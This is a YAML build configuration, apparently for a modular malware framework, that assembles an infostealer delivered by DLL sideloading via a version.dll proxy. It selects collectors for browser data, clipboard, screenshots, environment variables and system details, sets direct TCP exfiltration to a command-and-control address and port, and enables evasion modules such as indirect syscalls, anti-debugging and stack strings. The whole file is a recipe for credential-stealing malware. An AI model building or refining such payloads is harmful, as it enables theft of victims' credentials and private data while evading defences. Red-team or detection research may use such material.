name: infostealer_sideload
description: Infostealer delivered via DLL sideloading (version.dll proxy)

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/system_info
  - collectors/processes
  - collectors/installed_software
  - collectors/env_vars
  - collectors/clipboard
  - collectors/browser_chromium
  - collectors/screenshot

exfil: exfil/tcp_direct
arch: arch/dll_sideload
def_file: version.def

resources: true
api_resolve: api_resolve/api_hash_djb2

evasion:
  - evasion/indirect_syscall
  - evasion/behavioral_pacing
  - evasion/entropy_pad
  - evasion/stack_strings
  - evasion/anti_debug

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
